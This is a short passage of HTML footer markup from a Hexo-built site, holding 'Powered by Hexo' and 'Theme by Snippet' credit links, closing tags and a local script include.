                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
                </span> |
                <span>
                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
                </span>
            </div>
        </div>
    </div>
</div>







<script src="/js/app.js?rev=@@hash"></script>

</body>
</html>